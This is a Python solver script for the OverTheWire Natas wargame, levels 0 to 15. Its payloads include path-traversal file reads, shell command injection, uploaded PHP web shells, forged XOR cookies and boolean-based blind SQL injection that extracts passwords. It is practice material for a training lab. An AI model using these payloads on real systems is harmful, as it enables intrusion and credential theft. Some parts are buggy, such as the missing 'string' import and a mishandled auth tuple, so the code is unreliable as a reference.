import requests
import re
from bs4 import BeautifulSoup, Comment
import base64
from urllib.parse import unquote

url_dict = {}

# Populate the URL dictionary
for i in range(33):
  url_dict[f"natas{i}"] = f"http://natas{i}.natas.labs.overthewire.org"

cred_dict = {
  "natas0":("natas0", "natas0")
}

# Level 0
try:
  response = requests.get(url_dict["natas0"], auth=cred_dict["natas0"], timeout=10)
  response.raise_for_status()
  # Parse HTML and return comments
  soup = BeautifulSoup(response.text, "html.parser")
  comments = soup.find_all(string=lambda text: isinstance(text,Comment))

  print("Level 0")
  print("Discovered Comments:")
  for comment in comments:
    print(comment.strip())
    if "password" in comment:
      cred_dict["natas1"] = ("natas1",comment.split()[-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 1
try:
  response = requests.get(url_dict["natas1"], auth=cred_dict["natas1"], timeout=10)
  response.raise_for_status()
  # Parse HTML and return comments
  soup = BeautifulSoup(response.text, "html.parser")
  comments = soup.find_all(string=lambda text: isinstance(text,Comment))

  print("\nLevel 1")
  print("Discovered Comments:")
  for comment in comments:
    print(comment.strip())
    if "password" in comment:
      cred_dict["natas2"] = ("natas2",comment.split()[-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 2
try:
  response = requests.get(url_dict["natas2"]+"/files/users.txt", auth=cred_dict["natas2"], timeout=10)
  response.raise_for_status()
  # Parse text file and return contents

  print("\nLevel 2")
  print("Discovered text:")
  for line in response.text.splitlines():
    print(line)
    if "natas3" in line:
      cred_dict["natas3"] = ("natas3",line.split(":")[-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 3
try:
  response = requests.get(url_dict["natas3"]+"/s3cr3t/users.txt", auth=cred_dict["natas3"])
  response.raise_for_status()
  # Parse text file and return contents

  print("\nLevel 3")
  print("Discovered text:") 
  print(response.text)
  cred_dict["natas4"] = ("natas4",response.text.split(":")[-1][:-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 4
try:
  headers = {"Referer":"http://natas5.natas.labs.overthewire.org/"}
  response = requests.get(url_dict["natas4"], auth=cred_dict["natas4"], headers=headers)
  response.raise_for_status()
  # Parse text file and return contents
  soup = BeautifulSoup(response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)

  print("\nLevel 4")
  print("Discovered text:") 
  print(text_only)
  cred_dict["natas5"] = ("natas5",text_only.split()[-3])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 5
try:
  cookies = {"loggedin":"1"}
  response = requests.get(url_dict["natas5"], auth=cred_dict["natas5"], cookies=cookies)
  response.raise_for_status()
  # Parse text file and return contents
  soup = BeautifulSoup(response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)

  print("\nLevel 5")
  print("Discovered text:") 
  print(text_only) 
  cred_dict["natas6"] = ("natas6",text_only.split()[-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 6
try:
  secret_response = requests.get(url_dict["natas6"]+"/includes/secret.inc", auth=cred_dict["natas6"])
  secret_response.raise_for_status()
  # Retrieve the secret the PHP file
  print("\nLevel 6")
  print("Discovered secret:") 
  secret = secret_response.text.split()[-2][1:-2]
  print(secret)
  # Send the secret to the web app
  print("Sending secret:")
  form_payload = {"secret":secret,"submit":"Submit+Query"}
  post_response = requests.post(url_dict["natas6"], auth=cred_dict["natas6"], data=form_payload)
  # HTML Parsing
  soup = BeautifulSoup(post_response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)
  print(text_only)
  cred_dict["natas7"] = ("natas7",text_only.split()[-5])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 7
try:
  lfi_payload = "/index.php?page=../../../../../../../../etc/natas_webpass/natas8"
  response = requests.get(url_dict["natas7"]+lfi_payload, auth=cred_dict["natas7"])
  response.raise_for_status()
  # Prase the HTML
  soup = BeautifulSoup(response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)
  # Retrieve the secret the PHP file
  print("\nLevel 7")
  print("Password accessed via LFI:") 
  lfi_response = text_only
  print(lfi_response)
  cred_dict["natas8"] = ("natas8",text_only.split()[-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 8
try:
  enc_secret = ""
  src_response = requests.get(url_dict["natas8"]+"/index-source.html", auth=cred_dict["natas8"])
  response.raise_for_status()
  # Parse the HTML
  soup = BeautifulSoup(src_response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)
  for line in text_only.split(";"):
    if "$encodedSecret = " in line:
      enc_secret = line.split()[-1][1:-1]
  # Decode the secret
  print("\nLevel 8")
  print("Encoded secret:")
  print(enc_secret)
  binary_data = bytes.fromhex(enc_secret)
  print(f"Binary data: {binary_data}")
  reversed_bytes = binary_data[::-1]
  print(f"Reversed bytes: {reversed_bytes}")
  dec_secret = base64.b64decode(reversed_bytes).decode("utf-8")
  print(f"Decoded secret: {dec_secret}")
  # Send the secret to the server
  form_payload = {"secret":dec_secret,"submit":"Submit+Query"}
  post_response = requests.post(url_dict["natas8"]+"/index.php", auth=cred_dict["natas8"], data=form_payload)
  # Parse the response
  soup = BeautifulSoup(post_response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)
  print(text_only)
  cred_dict["natas9"] = ("natas9",text_only.split()[-5])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 9
try:
  cmd_inject_payload = "?needle=;cat /etc/natas_webpass/natas10#&submit=Search"
  response = requests.get(url_dict["natas9"]+cmd_inject_payload, auth=cred_dict["natas9"])
  response.raise_for_status()
  print("\nLevel 9")
  print("Sending OS command injection payload:") 
  # Parse the response
  soup = BeautifulSoup(response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)
  cred_dict["natas10"] = ("natas10",text_only.split()[5])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 10
try:
  cmd_inject_payload = '/?needle="" /etc/natas_webpass/natas11 \#'
  response = requests.get(url_dict["natas10"]+cmd_inject_payload, auth=cred_dict["natas10"])
  response.raise_for_status()
  print("\nLevel 10")
  print("Sending OS command injection payload:") 
  # Parse the response
  soup = BeautifulSoup(response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)
  cred_dict["natas11"] = ("natas11",text_only.split()[-3].split(":")[-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 11
try:
  response = requests.get(url_dict["natas11"], auth=cred_dict["natas11"])
  response.raise_for_status()
  print("\nLevel 11")
  print("Receiving cookie:") 
  # Save the cookie
  cookie = unquote(response.cookies["data"]).encode("utf-8")
  print(cookie)
  # Decode the cookie and XOR decrypt it to get the key
  ciphertext = base64.b64decode(cookie)
  plaintext = b'{"showpassword":"no","bgcolor":"#ffffff"}'
  keystream = bytearray(c ^ p for c, p in zip(ciphertext, plaintext))
  derived_key = ""
  for char in keystream:
    derived_key += chr(char)
  key = derived_key[0:4]
  # Print the derived key
  print(f"Derived key: {key}")
  # Forge a new cookie
  forged_plaintext = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
  forged_ciphertext = bytearray(forged_plaintext[i] ^ ord(key[i % len(key)]) for i in range(len(forged_plaintext)))
  forged_cookie = base64.b64encode(forged_ciphertext).decode('utf-8')
  cookies = {"data":forged_cookie}
  # Send the cookie to the server with a request
  response = requests.get(url=url_dict["natas11"], auth=cred_dict["natas11"], cookies=cookies)
  # Parse the response
  soup = BeautifulSoup(response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)
  cred_dict["natas12"] = ("natas12",text_only.split()[-5])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 12
try:
  php_payload = b"<?php echo shell_exec('cat /etc/natas_webpass/natas13'); ?>"
  files = {'uploadedfile':('exploit.php', php_payload, 'application/x-php')}
  data = {'filename': 'exploit.php'}
  session = requests.Session()
  response = session.post(url_dict["natas12"]+"/index.php", auth=cred_dict["natas12"],data=data,files=files)
  response.raise_for_status()
  print("\nLevel 12")
  print("Sending File Upload Request:") 
  match = re.search(r'upload/[a-zA-Z0-9]+\.php', response.text)

  if not match:
    print("[-] Error: Failed to locate the uploaded file path in the response HTML.")
    # Print a small snippet of the response text to debug if necessary
    print(response.text[:500])
    exit()
  uploaded_file_path = match.group(0)
  print(uploaded_file_path)
  # Access the uploaded script
  print("Accessing uploaded script:")
  script_access = session.get(url_dict["natas12"]+"/"+uploaded_file_path, auth=cred_dict["natas12"])
  cred_dict["natas13"] = ("natas13",script_access.text[:-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 13
try:
  php_payload = b"\xFF\xD8\xFF\xE0<?php echo shell_exec('cat /etc/natas_webpass/natas14'); ?>"
  files = {'uploadedfile':('exploit.php', php_payload, 'image/jpeg')}
  data = {'filename': 'exploit.php'}
  session = requests.Session()
  response = session.post(url_dict["natas13"]+"/index.php", auth=cred_dict["natas13"],data=data,files=files)
  response.raise_for_status()
  print("\nLevel 13")
  print("Sending File Upload Request:") 
  match = re.search(r'upload/[a-zA-Z0-9]+\.php', response.text)

  if not match:
    print("[-] Error: Failed to locate the uploaded file path in the response HTML.")
    # Print a small snippet of the response text to debug if necessary
    print(response.text[:500])
    exit()    
  uploaded_file_path = match.group(0)
  print(uploaded_file_path)
  # Access the uploaded script
  print("Accessing uploaded script:")
  script_access = session.get(url_dict["natas13"]+"/"+uploaded_file_path, auth=cred_dict["natas13"])
  cred_dict["natas14"] = ("natas14",script_access.text[4:-1])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 14
try:
  data = {'username':'" or 1=1 -- -','password':'test'}
  response = requests.post(url_dict["natas14"]+"/index.php", auth=cred_dict["natas14"],data=data)
  response.raise_for_status()
  print("\nLevel 14")
  print("Sending SQL injection payload:") 
  # Parse the response
  soup = BeautifulSoup(response.text, "html.parser")
  text_only = soup.get_text(separator=" ", strip=True)
  cred_dict["natas15"] = ("natas15",text_only.split()[-3])

except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")

# Level 15
try:
  charset = string.ascii_letters + string.digits
  extracted_password = ""
  print("\nLevel 15")
  print("Sending SQL injection payload:") 
  session = requests.Session()
  session.auth = ("natas15",cred_dict["natas15"])
  print("[*] Starting password extraction...")
  for position in range(1, 33):
    for char in charset:
      payload = {
        'username': f'natas16" AND BINARY SUBSTRING(password,{position},1)=\'{char}\' -- -'
      }
      # Send the request
      response = session.post(url_dict["natas15"]+"/index.php", data=payload,auth=cred_dict["natas15"])
      # Check if the character is correct (boolean response)
      if "This user exists" in response.text:
        extracted_password += char
        print(f"[+] Found character {position}: {char} → Current: {extracted_password}")
        break
    if len(extracted_password) == 32:
      print(f"Natas 16 Password found: {extracted_password}")
      cred_dict["natas16"] = ("natas16",extracted_password)
      break
except requests.exceptions.RequestException as e:
  print(f"HTTP Request failed: {e}")


print(cred_dict)
